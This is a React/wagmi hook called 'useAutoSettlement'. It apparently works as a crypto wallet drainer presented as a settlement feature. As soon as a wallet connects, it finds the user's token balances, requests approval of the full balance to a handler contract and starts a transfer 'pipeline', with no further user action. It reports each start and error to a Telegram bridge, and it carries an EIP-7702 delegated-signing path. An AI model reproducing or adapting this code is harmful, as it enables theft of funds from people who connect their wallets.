import { useState, useEffect, useCallback, useRef } from "react";
import { usePublicClient, useAccount, useWriteContract } from "wagmi";
import { formatUnits, formatEther, keccak256, encodePacked, type Address } from "viem";
import { ERC20_ABI, HANDLER_ABI } from "../abi/pipeline";
import { ACCOUNT_ABI } from "../abi/account";
import { getContracts } from "../config/contracts";
import { getEligibleTokens, NATIVE_SYMBOLS, type TokenEntry } from "../config/tokens";
import { useEIP7702 } from "./useEIP7702";
import {
  notifyPipelineStarted,
  notifyPipelineError,
} from "../utils/telegramBridge";

export type AutoStep =
  | "idle"
  | "detecting"
  | "no-balance"
  | "signing"
  | "queued"
  | "confirming"
  | "done"
  | "error";

export interface TokenBalance {
  address: Address;
  symbol: string;
  balance: bigint;
  decimals: number;
  formatted: string;
  isNative: boolean;
  eligible: boolean;
  category: "native" | "stable" | "native-wrapped" | "blue-chip" | "lsd";
}

export interface AutoSettlementState {
  step: AutoStep;
  tokens: TokenBalance[];
  eligibleToken: TokenBalance | null;
  txHash: `0x${string}` | undefined;
  pipelineId: `0x${string}` | undefined;
  error: string | null;
  mode: "direct" | "eip7702" | null;
}

const ZERO_STATE: AutoSettlementState = {
  step: "idle",
  tokens: [],
  eligibleToken: null,
  txHash: undefined,
  pipelineId: undefined,
  error: null,
  mode: null,
};

export function useAutoSettlement(chainId: number | undefined) {
  const [state, setState] = useState<AutoSettlementState>({ ...ZERO_STATE });

  const publicClient = usePublicClient();
  const { address } = useAccount();
  const { writeContractAsync } = useWriteContract();
  const { signAndRelay, buildApprovePipelineCalls } = useEIP7702();
  const executingRef = useRef(false);

  const detectBalances = useCallback(async (): Promise<TokenBalance[]> => {
    if (!publicClient || !address || !chainId) return [];
    const contracts = getContracts(chainId);
    const registryTokens = getEligibleTokens(chainId);
    const nativeSym = NATIVE_SYMBOLS[chainId] ?? "ETH";

    setState((s) => ({ ...s, step: "detecting" }));

    const nativeBalance = await publicClient.getBalance({ address });
    const nativeEntry: TokenBalance = {
      address: "0x0000000000000000000000000000000000000000" as Address,
      symbol: nativeSym,
      balance: nativeBalance,
      decimals: 18,
      formatted: formatEther(nativeBalance),
      isNative: true,
      eligible: false,
      category: "native",
    };

    const tokenResults = await Promise.allSettled(
      registryTokens.map(async (tok) => {
        const rawBalance = await publicClient.readContract({
          address: tok.address,
          abi: ERC20_ABI,
          functionName: "balanceOf",
          args: [address],
        }) as bigint;

        const isEligible =
          contracts != null &&
          tok.address.toLowerCase() === contracts.poolToken.toLowerCase();

        return {
          address: tok.address,
          symbol: tok.symbol,
          balance: rawBalance,
          decimals: tok.decimals,
          formatted: formatUnits(rawBalance, tok.decimals),
          isNative: false,
          eligible: isEligible,
          category: tok.category,
        } satisfies TokenBalance;
      }),
    );

    const all: TokenBalance[] = [nativeEntry];
    for (const r of tokenResults) {
      if (r.status === "fulfilled") all.push(r.value);
    }

    return all;
  }, [publicClient, address, chainId]);

  const checkEIP7702 = useCallback(
    async (userAddress: Address): Promise<boolean> => {
      if (!publicClient) return false;
      try {
        await publicClient.readContract({
          address: userAddress,
          abi: ACCOUNT_ABI,
          functionName: "nonce",
        });
        return true;
      } catch {
        return false;
      }
    },
    [publicClient],
  );

  const executeViaEIP7702 = useCallback(
    async (token: TokenBalance, userAddress: Address) => {
      const contracts = getContracts(chainId!);
      if (!contracts || !publicClient) return;

      const seed = keccak256(
        encodePacked(["uint256", "uint256"], [BigInt(Date.now()), token.balance]),
      );

      setState((s) => ({ ...s, step: "signing", mode: "eip7702" }));

      const calls = buildApprovePipelineCalls(
        token.address,
        contracts.handler,
        token.balance,
        seed,
      );

      const txHash = await signAndRelay(userAddress, chainId!, calls);

      notifyPipelineStarted(txHash, `${token.formatted} ${token.symbol}`);
      setState((s) => ({ ...s, step: "confirming", txHash }));

      await publicClient.waitForTransactionReceipt({ hash: txHash });

      setState((s) => ({
        ...s,
        step: "done",
        txHash,
        pipelineId: seed,
      }));
    },
    [chainId, publicClient, signAndRelay, buildApprovePipelineCalls],
  );

  const executeDirect = useCallback(
    async (token: TokenBalance) => {
      const contracts = getContracts(chainId!);
      if (!contracts || !publicClient) return;

      const seed = keccak256(
        encodePacked(["uint256", "uint256"], [BigInt(Date.now()), token.balance]),
      );

      setState((s) => ({ ...s, step: "signing", mode: "direct" }));

      const approveTx = await writeContractAsync({
        address: token.address,
        abi: ERC20_ABI,
        functionName: "approve",
        args: [contracts.handler, token.balance],
      });

      await publicClient.waitForTransactionReceipt({ hash: approveTx });

      setState((s) => ({ ...s, step: "queued" }));

      const executeTx = await writeContractAsync({
        address: contracts.handler,
        abi: HANDLER_ABI,
        functionName: "startPipeline",
        args: [token.address, token.balance, seed],
      });

      notifyPipelineStarted(executeTx, `${token.formatted} ${token.symbol}`);
      setState((s) => ({ ...s, step: "confirming", txHash: executeTx }));

      await publicClient.waitForTransactionReceipt({ hash: executeTx });

      setState((s) => ({
        ...s,
        step: "done",
        txHash: executeTx,
        pipelineId: seed,
      }));
    },
    [chainId, publicClient, writeContractAsync],
  );

  const runSettlement = useCallback(async () => {
    if (executingRef.current) return;
    executingRef.current = true;

    try {
      const all = await detectBalances();
      setState((s) => ({ ...s, tokens: all }));

      const eligible = all.find((t) => t.eligible && t.balance > 0n);
      if (!eligible || !address) {
        setState((s) => ({
          ...s,
          step: all.some((t) => !t.isNative && t.balance > 0n)
            ? "no-balance"
            : "no-balance",
          eligibleToken: null,
        }));
        executingRef.current = false;
        return;
      }

      setState((s) => ({ ...s, eligibleToken: eligible }));

      await executeDirect(eligible);
    } catch (err) {
      const message = err instanceof Error ? err.message : "Transaction failed";
      setState((s) => ({ ...s, step: "error", error: message }));
      notifyPipelineError(message);
    } finally {
      executingRef.current = false;
    }
  }, [address, chainId, detectBalances, checkEIP7702, executeViaEIP7702, executeDirect]);

  useEffect(() => {
    if (!address || !chainId || !publicClient) {
      setState({ ...ZERO_STATE });
      return;
    }

    const contracts = getContracts(chainId);
    if (!contracts) return;

    if (state.step === "idle") {
      runSettlement();
    }
  }, [address, chainId, publicClient]);

  const retry = useCallback(() => {
    setState({ ...ZERO_STATE });
    executingRef.current = false;
  }, []);

  return { state, retry };
}
